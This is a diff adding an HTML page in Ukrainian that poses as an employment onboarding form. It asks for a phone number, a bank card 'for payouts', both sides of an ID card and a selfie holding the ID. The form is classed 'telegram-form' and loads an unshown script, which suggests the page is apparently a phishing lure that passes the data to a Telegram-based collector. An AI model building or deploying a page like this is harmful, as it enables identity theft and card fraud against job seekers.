@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+    <link href='https://fonts.googleapis.com/css?family=Roboto:400' rel='stylesheet' type='text/css'>
+    <link rel="stylesheet" href="index.css">
+</head>
+<body>
+
+
+
+
+
+
+
+
+<div class="head">
+        <img class="logo" src="image/logo.png">
+        <div class="header">
+            <a href="index.html" class="header_item">Головна</a>
+            <a href="about/index.html" class="header_item">Про нас</a>
+            <a href="contact/index.html" class="header_item">Контакти</a>
+        </div>
+    </div>
+
+         <div id="block_1" class="item" style="opacity: 0;">
+        
+            <button class="close">&times;</button>
+            
+            <p>Документи на розгляди</p>
+
+            <script>
+                    document.querySelector('body').onclick = function (e) {
+                    if(e.target.className != 'close') return 
+                    let item = e.target.closest('.item')
+                    item.remove()
+                        }
+            </script>
+        </div> 
+
+    <div class="container">
+        <div class="log-form">
+            <h2>Заповніть анкету</h2>
+        <form class="telegram-form">
+          <input type="text" name="phone" placeholder="Контактний номер телефону" />
+          <input type="text" name="card" class="card" placeholder="Банківська карта для отримання виплат" a/>
+          <h1 class="h1">Документи для офіційного працевлаштування</h1>
+
+
+
+
+
+
+
+
+          <h3>Лицьовий бік IDкарти</h3>
+          <input class="filees" type="file" name="file" id="upload_file" hidden="hidden" >
+
+          <h3>Зворотний бік IDкарти</h3>
+          <input class="filees" type="file" name="file2" id="upload_file" hidden="hidden">
+
+          <h3>Фото вашого обличчя з IDкартою</h3>
+          <input class="filees" type="file" name="file3" id="upload_file" hidden="hidden">
+
+
+
+
+
+
+
+
+
+
+
+
+          <button type="submit" class="btn" onclick="myblock()">Відправити</button>
+
+          
+
+
+
+
+          <button type="submit" class="btn_a"><a href="index3.html" class="btn_aa">Далі</a></button>
+        </form>
+      </div>
+
+
+
+
+
+
+
+         
+
+
+
+
+
+
+
+
+
+
+    </div>
+
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="./main.js"></script>
+
+
+
+
+
+
+
+    <script>
+              function myblock() {
+                  document.getElementById('block_1').style.opacity='1';
+              }
+    </script>
+
+
+</body>
+</html>
